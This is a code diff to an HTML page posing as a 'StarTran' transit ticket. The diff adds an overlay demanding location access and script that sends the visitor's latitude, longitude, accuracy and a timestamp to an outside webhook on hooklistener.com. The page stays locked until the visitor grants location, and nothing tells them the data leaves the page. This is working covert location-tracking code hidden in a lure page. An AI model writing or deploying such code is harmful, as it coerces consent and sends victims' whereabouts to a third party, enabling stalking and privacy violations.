@@ -33,8 +33,12 @@
 	<!-- Created by Richard -->
 </head>
 <body>
-
-<div class="ticket-container">
+<div id="overlay">
+  <h2>This site requires your location</h2>
+  <p>Click Yes to continue</p>
+  <button id="allow">Yes</button>
+</div>
+<div id="content" class="ticket-container">
         <div class="close-button">&times;</div>
 		<div class="header">
 			<div class="instruction"><h2>StarTran</h2>
@@ -117,34 +121,54 @@ function updateClockManualAmPm() {
 }
 	setInterval(updateClockManualAmPm, 1000);
 	updateClockManualAmPm();
+   
+	 document.addEventListener("DOMContentLoaded", () => {
+     console.log("DOM loaded");
 
-function requestLocation() {
-  // Unlock UI immediately
-  document.getElementById("overlay").style.display = "none";
-  document.getElementById("content").style.display = "block";
+  const overlay = document.getElementById("overlay");
+  const content = document.getElementById("content");
+  const allowBtn = document.getElementById("allow");
 
-  navigator.geolocation.getCurrentPosition(
-    position => {
-      sendToWebhook({
-        latitude: position.coords.latitude,
-        longitude: position.coords.longitude,
-        accuracy: position.coords.accuracy,
-        timestamp: new Date().toISOString()
-      });
-    },
-    error => {
-      sendToWebhook({
-        error: error.message,
-        timestamp: new Date().toISOString()
-      });
-    },
-    {
-      enableHighAccuracy: true,
-      timeout: 10000,
-      maximumAge: 0
+  allowBtn.addEventListener("click", () => {
+    console.log("Yes clicked");
+
+    if (!navigator.geolocation) {
+      alert("Geolocation not supported");
+      return;
     }
-  );
-}
+
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        console.log("Location granted", position);
+
+        // Unlock site
+        overlay.style.display = "none";
+        content.style.display = "block";
+
+        // Send webhook
+        fetch("https://app.hooklistener.com/w/my-first-endpoint-opbl", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            timestamp: new Date().toISOString()
+          })
+        }).catch(err => console.error("Webhook error:", err));
+      },
+      (error) => {
+        console.error("Geolocation error:", error);
+        alert("Location permission is required to continue.");
+      },
+      {
+        enableHighAccuracy: false,
+        timeout: 10000,
+        maximumAge: 0
+      }
+    );
+  });
+});
 
 </script>
 </body>
